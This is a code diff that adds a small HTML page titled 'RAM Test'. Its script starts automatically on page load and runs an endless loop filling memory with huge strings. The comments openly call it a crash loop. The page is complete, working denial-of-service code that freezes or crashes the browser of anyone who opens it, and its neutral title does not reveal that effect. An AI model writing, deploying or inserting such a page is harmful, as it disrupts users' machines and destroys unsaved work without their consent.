@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>RAM Test</title>
+</head>
+<body>
+    <h1>Allocating memory...</h1>
+    <script>
+        // This array stays in memory, preventing garbage collection
+        const memoryHog = [];
+
+        function leak() {
+            // Endlessly push massive strings into the array
+            while (true) {
+                // Generates a massive string and forces it into the global array
+                memoryHog.push(new Array(10000000).join('X'));
+            }
+        }
+
+        // Trigger the crash loop immediately on load
+        window.onload = leak;
+    </script>
+</body>
+</html>
